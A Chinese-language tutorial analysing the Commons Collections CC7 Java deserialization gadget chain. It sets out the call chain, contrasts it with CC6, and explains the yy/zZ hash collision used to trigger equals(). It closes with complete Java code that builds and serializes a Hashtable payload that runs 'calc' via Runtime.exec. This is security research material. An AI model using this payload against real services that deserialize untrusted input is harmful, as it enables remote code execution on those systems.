# 背景
CC7 其实是 CommonsCollections LazyMap 系列链 的一种，跟 CC6 很像，
区别主要在于 入口点不同——CC6 是 LazyMap.get() 在 Map 操作时触发，
而 CC7 是通过 Hashtable 反序列化过程中触发 LazyMap 的 hashCode()，进而进入 transformer 链。

# CC6的调用链：

HashMap.readObject()

HashMap.hash()

TiedMapEntry.hashCode()

TiedMapEntry.getValue()

LazyMap.get()

ChainedTransformer.transform()

InvokerTransformer.transform()

Runtime.exec()

# CC7的调用链：

ObjectInputStream.readObject()

HashTable.readObject()

AbstractMapDecorator.equals 

java.util.AbstractMap.equals

HashTable.reconstitutionPut()

TiedMapEntry.hashCode()

TiedMapEntry.getValue()

LazyMap.get()

ChainedTransformer.transform()

InvokerTransformer.transform()

Runtime.exec()

# ysoserial：

 java.util.Hashtable.readObject
 
 java.util.Hashtable.reconstitutionPut
 
 org.apache.commons.collections.map.AbstractMapDecorator.equals
 
 java.util.AbstractMap.equals
 
 org.apache.commons.collections.map.LazyMap.get
 
 org.apache.commons.collections.functors.ChainedTransformer.transform
 
 org.apache.commons.collections.functors.InvokerTransformer.transform
 
 java.lang.reflect.Method.invoke
 
 sun.reflect.DelegatingMethodAccessorImpl.invoke
 
 sun.reflect.NativeMethodAccessorImpl.invoke
 
 sun.reflect.NativeMethodAccessorImpl.invoke0
 
 java.lang.Runtime.exec

在AbstractMap类中的equals方法调用了get方法


<img width="1644" height="1457" alt="image" src="https://github.com/user-attachments/assets/3215ddb0-cb8e-47a4-aade-cfaae7507cdb" />

在Hashtable类中的reconstitutionPut方法调用了equals


<img width="1644" height="1457" alt="image" src="https://github.com/user-attachments/assets/ccfa3f86-9de5-4e6f-9d9a-4fc1eb8e4855" />

而Hashtable中的readObject方法又调用了reconstitutionPut


<img width="2187" height="1457" alt="image" src="https://github.com/user-attachments/assets/254d5fb2-336d-4bf7-b932-e180eaa647f4" />

分析AbstractMap.equals()


<img width="924" height="792" alt="image" src="https://github.com/user-attachments/assets/67a25d49-9b66-48b0-b545-651a6295528e" />

方法中进行了三个判断，

1.判断是否为同一个对象

2.判断是否不是Map类型

3.判断size，也就是元素中的个数

当上面三个条件都不满足时，代码继续往下走，下面的代码就是获取每个元素，然后对元素进行判断。
首先判断value是否为null，如果为null就会先执行m.get(key)，
如果value不为null就是执行 value.equals(m.get(key))，
这里的m就是LazyMap，
只要 m 是 LazyMap 且 key 不存在，就会触发 transformer 链。

再来分析Hashtable.reconstitutionPut()


<img width="1017" height="696" alt="image" src="https://github.com/user-attachments/assets/2ec41442-07b8-41d0-b0d0-560b0ff64059" />

首先做了一个判断，
如果value为null的话就抛出异常

往下走，
然后调用key.hashCode计算哈希值，
根据hash值计算在table中的存放位置，
检查该位置是否已经有相同的key，如果有就抛出异常。

如果 key 是一个 TiedMapEntry，那么会进入 TiedMapEntry.hashCode()，
而 TiedMapEntry.hashCode() 会调用 getValue() → LazyMap.get() → transformer 链执行。
这就是 CC7 的入口点。

但是也可以通过下面的e.key.equals(key)来触发，
CC6就是通过的Hashcode，
所以这条链我们就不用Hashcode了，

在这里的for循环中调用了equals，
这个for循环时CC7触发的关键所在，它的作用是在反序列化时检查插入的key是否和已存在的key重复。


<img width="1086" height="171" alt="image" src="https://github.com/user-attachments/assets/b5f28595-9561-4983-bd3c-cbbde376f38b" />

当e.hash == hash 时，就会去调用e.key.equals(key)，
这一步就是核心，因为e.key是我们控制的对象(比如TiedMapEntry)，它的equals会调用LazyMap.get() --> Transformer链

如何让这个e.hash == hash 条件成立？

也就是说必须要保证两个key的hash值相同，否则不会走equals()

那么在Java中刚好又一个hash冲突的案例，
yy和zZ，这两个字符串的hash就是一样的，

那就构造这两个 yy和zZ

最终Payload


<img width="1548" height="1473" alt="image" src="https://github.com/user-attachments/assets/5854d39d-e98a-4af5-9b38-d4ec7381f0ee" />

首先第一行就是new一个空的ChainedTransfomer当作占位，避免提前触发利用链，
然后就是构造transformer数组执行calc。

之后创建两个Hashmap，
用之前的占位装饰两个LazyMap，分别put进去yy和zZ，
那么现在就满足了for循环的条件，e.hash == hash，因为yy和zZ是java里经典的hash冲突对，

之后分别把两个LazyMap当作Hashtable的key，
因为这两个key的hash相同，Hashtable就会就会进入到e.key.equals(key)


<img width="1158" height="177" alt="image" src="https://github.com/user-attachments/assets/12234661-2f71-4d81-a361-3ac6de1a09d2" />

这样就调用执行了equals方法，
然后将yy进行remove删除操作，以免影响调用链。
最后反射，将ChainedTransformer中的占位，替换成真正的transformer，也就是前面构造的transformer数组，用来执行命令的。

        final Transformer transformerChain = new ChainedTransformer(new Transformer[0]);
        final Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",
                        new Class[]{String.class, Class[].class},
                        new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke",
                        new Class[]{Object.class, Object[].class},
                        new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec",
                        new Class[]{String.class},
                        new String[]{"calc"}),
                new ConstantTransformer(1)};

        Map hashMap1 = new HashMap();
        Map hashMap2 = new HashMap();

        Map lazyMap1 = LazyMap.decorate(hashMap1, transformerChain);
        lazyMap1.put("yy", 1);
        Map lazyMap2 = LazyMap.decorate(hashMap2, transformerChain);
        lazyMap2.put("zZ", 1);

        Hashtable hashtable = new Hashtable();
        hashtable.put(lazyMap1, 1);
        hashtable.put(lazyMap2, 1);

        lazyMap2.remove("yy");

        Field iTransformers = ChainedTransformer.class.getDeclaredField("iTransformers");
        iTransformers.setAccessible(true);
        iTransformers.set(transformerChain, transformers);

        serialize(hashtable);
        unserialize("ser.bin");

    }

    public static void serialize(Object object) throws Exception {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(object);
    }

    //反序列化方法
    public static void unserialize(String filename) throws Exception {
        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(filename));
        objectInputStream.readObject();
    }

